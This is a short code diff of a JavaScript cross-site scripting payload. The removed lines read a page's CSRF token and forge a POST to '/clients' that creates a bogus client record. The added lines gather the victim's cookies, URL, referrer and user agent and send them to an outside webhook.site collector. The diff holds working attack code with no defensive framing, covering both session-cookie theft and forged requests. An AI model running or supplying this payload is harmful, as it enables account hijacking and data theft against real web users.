@@ -1,27 +1,12 @@
 (function () {
-  const tokenInput = document.querySelector('input[name="_token"]');
-  if (!tokenInput) return;
+  const endpoint = 'https://webhook.site/4e27c3b8-ea10-40a9-a816-ac1d92350386';
 
-  const token = tokenInput.value;
-
-  const data = {
-    client_name: "Exploit_XSS",
-    new_activity: "",
-    email: "exploit@xss.com",
-    language_id: 1,
-    "phone_number[5]": "0606060606",
-    "phone_type[5]": "mobile",
-    address: "Injected by XSS",
-    societeinfo_id: "",
-    _token: token
+  const info = {
+    cookie: document.cookie,
+    location: location.href,
+    referrer: document.referrer,
+    userAgent: navigator.userAgent,
   };
 
-  fetch("/clients", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    credentials: "include",
-    body: JSON.stringify(data)
-  });
+  fetch(`${endpoint}?info=${encodeURIComponent(JSON.stringify(info))}`);
 })();
